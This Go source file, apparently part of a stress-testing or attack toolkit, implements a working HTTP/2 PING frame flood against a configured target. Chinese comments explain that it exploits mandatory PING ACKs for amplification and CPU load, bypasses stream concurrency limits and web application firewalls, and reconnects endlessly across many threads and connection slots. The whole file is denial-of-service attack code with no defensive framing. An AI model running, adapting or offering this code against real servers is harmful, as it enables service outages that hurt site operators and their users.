package attack

import (
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

// ============================================================
// HTTP/2 PING 帧风暴：
// 在已建立的 h2 连接上反复发送 PING 帧（17B），目标必须回 PING ACK——
// 帧级 2x 放大 + 帧解析/调度 CPU 开销，且 PING 不受流并发上限限制、
// 不触发应用层处理（绕过 Web 应用防护只看请求的盲区）。
// 复用 dialH2 基础设施；每线程多连接槽并行（帧率不受 RTT 限制）。
// ============================================================

// h2PingSlotsPerThread 每线程连接槽数
const h2PingSlotsPerThread = 4

// StartH2PingEx HTTP/2 PING 帧洪泛
func StartH2PingEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "h2_ping", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 {
		s.abort()
		return s
	}
	t0 := targets[0]
	if !strings.HasPrefix(t0, "http") {
		t0 = "http://" + t0
	}
	useTLS := strings.HasPrefix(t0, "https")
	addr := hostPort(t0)

	// 随机 8 字节 PING 载荷
	pingData := [8]byte{}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()
				rng := NewFastRNG(time.Now().UnixNano() + seed)
				endTime := time.Now().Add(dur)

				var slotWG sync.WaitGroup
				for slot := 0; slot < h2PingSlotsPerThread; slot++ {
					slotWG.Add(1)
					go func() {
						defer slotWG.Done()
						tc := newTimeCache()
						var conn net.Conn
						var framer *http2.Framer

						// 拨号/重连：失败退避，绝不退出
						ensureConn := func() bool {
							if framer != nil {
								return true
							}
							c, f, err := dialH2(addr, useTLS, 5*time.Second)
							if err != nil {
								atomic.AddUint64(&s.Stats.Errors, 1)
								time.Sleep(100 * time.Millisecond)
								return false
							}
							conn, framer = c, f
							return true
						}

						for tc.since(endTime) < 0 {
							select {
							case <-s.StopChan:
								if conn != nil {
									conn.Close()
								}
								return
							default:
							}

							if !ensureConn() {
								continue
							}
							if !s.checkRate(17) { // PING 帧 17B
								time.Sleep(time.Microsecond * 100)
								continue
							}

							rng.Read(pingData[:])
							conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
							if err := framer.WritePing(false, pingData); err != nil {
								// 连接损坏/目标断连：重连
								conn.Close()
								conn, framer = nil, nil
								atomic.AddUint64(&s.Stats.Errors, 1)
								continue
							}
							atomic.AddUint64(&s.Stats.PacketsSent, 1)
							atomic.AddUint64(&s.Stats.BytesSent, 17)
							tc.refresh()
						}
						if conn != nil {
							conn.Close()
						}
					}()
				}
				slotWG.Wait()
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}
